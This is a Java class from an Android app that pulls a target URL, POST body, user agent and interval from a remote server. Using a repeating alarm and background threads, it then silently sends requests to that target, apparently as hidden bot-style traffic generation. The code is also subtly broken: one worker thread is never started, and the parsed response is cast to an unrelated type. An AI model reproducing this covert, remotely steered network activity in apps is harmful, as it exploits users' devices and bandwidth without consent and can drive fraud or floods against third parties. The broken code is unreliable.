package com.aituidao.android.model;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.SystemClock;
import android.preference.PreferenceManager;

import com.aituidao.android.config.Config;
import com.aituidao.android.data.NewUrlAccessResponse;
import com.aituidao.android.data.SrcAddrTailCheckResponse;
import com.aituidao.android.helper.HttpClientHelper;
import com.aituidao.android.receiver.NewUrlAccessReceiver;
import com.alibaba.fastjson.JSON;

public class NewUrlAccessModel {
	private static NewUrlAccessModel mInstance = null;

	private Context mContext;
	private SharedPreferences mSharedPreferences;
	private SharedPreferences.Editor mEditor;

	private NewUrlAccessResponse mAccessInfo;

	private NewUrlAccessModel(Context context) {
		mContext = context.getApplicationContext();
		mSharedPreferences = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		mEditor = mSharedPreferences.edit();
	}

	private static final int ACCESS_URL_HANDLER_WHAT = 1;
	private static final int GOT_NEW_URL_HANDLER_WHAT = 2;

	@SuppressLint("HandlerLeak")
	private Handler mHandler = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case ACCESS_URL_HANDLER_WHAT:
				if ((mAccessInfo != null) && (mAccessInfo.url != null)
						&& (mAccessInfo.url.startsWith("http://"))) {
					startUrlAccess(mAccessInfo.userAgent, mAccessInfo.url,
							mAccessInfo.postStr);

					if ((mAccessInfo.periodMs <= 0)
							|| (mAccessInfo.timeout <= 0)) {
						startGetNewUrlAccess();
					} else {
						long curr = System.currentTimeMillis();
						if (curr > mAccessInfo.timeout) {
							startGetNewUrlAccess();
						} else {
							mHandler.sendEmptyMessageDelayed(
									ACCESS_URL_HANDLER_WHAT,
									mAccessInfo.periodMs);
						}
					}
				} else {
					mAccessInfo = null;
					setNewUrlAccessResponse(mAccessInfo);
				}
				break;

			case GOT_NEW_URL_HANDLER_WHAT:
				mAccessInfo = (NewUrlAccessResponse) msg.obj;

				if ((mAccessInfo == null) || (mAccessInfo.url == null)
						|| (!mAccessInfo.url.startsWith("http://"))) {
					mAccessInfo = null;
				} else {
					mHandler.sendEmptyMessage(ACCESS_URL_HANDLER_WHAT);
				}

				setNewUrlAccessResponse(mAccessInfo);
				break;
			}
		}
	};

	public static synchronized NewUrlAccessModel getInstance(Context context) {
		if (mInstance == null) {
			mInstance = new NewUrlAccessModel(context);
		}

		return mInstance;
	}

	public void checkAndStartNewUrlAccess() {
		mHandler.removeMessages(ACCESS_URL_HANDLER_WHAT);

		mAccessInfo = getNewUrlAccessResponse();
		if (mAccessInfo == null) {
			startGetNewUrlAccess();
		} else {
			mHandler.sendEmptyMessage(ACCESS_URL_HANDLER_WHAT);
		}

		Intent intent = new Intent(Config.NEW_URL_ACCESS_ACTION);
		intent.setClass(mContext, NewUrlAccessReceiver.class);
		PendingIntent pendingIntent = PendingIntent.getBroadcast(mContext, 0,
				intent, 0);

		AlarmManager am = (AlarmManager) mContext
				.getSystemService(Context.ALARM_SERVICE);
		am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME,
				SystemClock.elapsedRealtime()
						+ Config.NEW_URL_ACCESS_ACTION_PERIOD,
				Config.NEW_URL_ACCESS_ACTION_PERIOD, pendingIntent);
	}

	private void startGetNewUrlAccess() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				String responseStr = HttpClientHelper.requestStr(mContext,
						Config.DEFAULT_USER_AGENT, Config.NEW_URL_ACCESS_URL,
						null);

				SrcAddrTailCheckResponse response = null;
				try {
					response = JSON.parseObject(responseStr,
							SrcAddrTailCheckResponse.class);
				} catch (Exception e) {
				}

				mHandler.sendMessage(mHandler.obtainMessage(
						GOT_NEW_URL_HANDLER_WHAT, response));
			}
		}).start();
	}

	private void startUrlAccess(final String userAgent, final String url,
			final String postStr) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				HttpClientHelper.requestStatusCode(mContext, userAgent, url,
						postStr);
			}
		});
	}

	private static final String ACCESS_URL = "access_url";
	private static final String ACCESS_POST = "access_post";
	private static final String ACCESS_PERIOD = "access_period";
	private static final String ACCESS_TIMEOUT = "access_timeout";
	private static final String ACCESS_USER_AGENT = "access_user_agent";

	private NewUrlAccessResponse getNewUrlAccessResponse() {
		String url = mSharedPreferences.getString(ACCESS_URL, null);
		String post = mSharedPreferences.getString(ACCESS_POST, null);
		long period = mSharedPreferences.getLong(ACCESS_PERIOD, -1);
		long timeout = mSharedPreferences.getLong(ACCESS_TIMEOUT, -1);
		String userAgent = mSharedPreferences
				.getString(ACCESS_USER_AGENT, null);

		if ((url == null) || (!url.startsWith("http://"))) {
			setNewUrlAccessResponse(null);
			return null;
		}

		NewUrlAccessResponse result = new NewUrlAccessResponse();
		result.url = url;
		result.postStr = post;
		result.periodMs = period;
		result.timeout = timeout;
		result.userAgent = userAgent;

		return result;
	}

	private void setNewUrlAccessResponse(NewUrlAccessResponse response) {
		if (response == null) {
			mEditor.putString(ACCESS_URL, null);
			mEditor.putString(ACCESS_POST, null);
			mEditor.putLong(ACCESS_PERIOD, -1);
			mEditor.putLong(ACCESS_TIMEOUT, -1);
			mEditor.putString(ACCESS_USER_AGENT, null);
		} else {
			mEditor.putString(ACCESS_URL, response.url);
			mEditor.putString(ACCESS_POST, response.postStr);
			mEditor.putLong(ACCESS_PERIOD, response.periodMs);
			mEditor.putLong(ACCESS_TIMEOUT, response.timeout);
			mEditor.putString(ACCESS_USER_AGENT, response.userAgent);
		}

		mEditor.commit();
	}
}
